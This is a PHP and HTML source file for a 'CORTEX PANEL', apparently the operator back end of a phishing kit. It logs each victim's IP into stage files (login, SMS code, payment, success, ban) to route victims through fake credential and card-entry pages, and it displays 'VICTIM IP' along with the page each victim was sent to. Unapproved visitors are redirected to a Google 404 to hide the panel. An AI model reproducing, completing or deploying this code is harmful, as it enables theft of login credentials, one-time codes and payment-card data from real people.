<?php
session_start();

include "config.php";
include "functions.php";


if (!isset($_SESSION['allow']) || $_SESSION['allow'] !== "yes") {
    header('location: https://google.com/404');
    exit();
}

$ip = $_GET['ip'];
$step = $_GET['step'];

function writeOnFile($file, $ip) {
    if (file_exists($file)) {
        $content = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (in_array($ip, $content)) {
            return; 
        }
    }
    file_put_contents($file, $ip . PHP_EOL, FILE_APPEND);
}


if (isset($_GET['query']) && $_GET['query'] == 'user_info') {
    header('Content-Type: application/json');
    echo json_encode(getUserInfo());
    exit();
}


if (isset($_GET['query']) && $_GET['query'] == 'redirect_status') {
    $redirect_file = 'payment.txt';
    $status = 'No redirect set';
    if (file_exists($redirect_file)) {
        $content = trim(file_get_contents($redirect_file));
        if (!empty($content)) {
            $status = 'Redirecting to: ' . $content;
        }
    }
    echo $status;
    exit();
}

switch ($step) {
    case 'ban':
        writeOnFile("ban.txt", $ip);
        break;
    case 'info':
        writeOnFile("info.txt", $ip);
        break;
    case 'info-err':
        writeOnFile("infoerr.txt", $ip);
        break;
    case 'login':
        writeOnFile("login.txt", $ip);
        break;
    case 'login-err':
        writeOnFile("loginerr.txt", $ip);
        break;
    case 'sms':
        writeOnFile("sms.txt", $ip);
        break;
    case 'sms-err':
        writeOnFile("smserr.txt", $ip); 
        break;
    case 'payment':
        writeOnFile("payment.txt", $ip);
        break;
    case 'payment-err':
        writeOnFile("paymenterr.txt", $ip); 
        break;
    case 'success':
        writeOnFile("success.txt", $ip);
        break;
    default:
        break;
}

echo "No valid query specified.";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CORTEX PANEL</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Arvo:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
    <meta name="description" content="particles.js is a lightweight JavaScript library for creating particles.">
    <meta name="author" content="Vincent Garreau" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" media="screen" href="stye.css">
    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
</head>
<body style="font-family: 'Arvo', serif;">

<style>
header { 
  width: 100%;
  height: 140px;
  display: flex;
  align-items: center;
  justify-content: center;
  background-color: #6552ab1b;
  border-bottom: 1px solid #9678ff;
  box-shadow: 0 2px 4px rgba(90, 14, 102, 0.258), 0 -2px 4px rgba(255, 255, 255, 0.3);
  position: relative;
  }
.maain {
padding: 15px;
max-width: 300px;
width: 100%;
background-color: #6552ab1b;
border: 1px solid #9678ff;
box-shadow: 0 2px 4px rgba(90, 14, 102, 0.258), 0 -2px 4px rgba(255, 255, 255, 0.3);
border-radius: 8px;
}

main {
  display: flex;
  align-items: center;
  line-height: 24px;
  justify-content: center;
  border-radius: 8px;
  position: absolute;
  top: 30%;
  width: 100%;
}
main p {
  text-align: center;
  color: #9678ff;
}
header h1 {
  color: #9678ff;
  padding-top: 5px;
}
body{
  position: relative;
}
span {
    color: #fff;
}

</style>

<div id="particles-js" style="color: aliceblue;position: relative;">
<header style="position: absolute;flex-direction: column;">
<img src="logo.png" alt="" width="90px">
<h1>CORTEX PANEL</h1>
</header>

<main style="flex-direction: column;">
    <div class="maain">
        <p>VICTIM IP : <span > <?php echo htmlspecialchars($ip)?></span></p>
        <p>THE VICTIM HAS BEEN GO TO <span> <?php echo strtoupper(htmlspecialchars($step)) ?></span> PAGE SUCCESSFULY</p>
    </div>  

</main>
</div>

<script src="particles.js"></script>
<script src="app.js"></script>


</body>
</html>
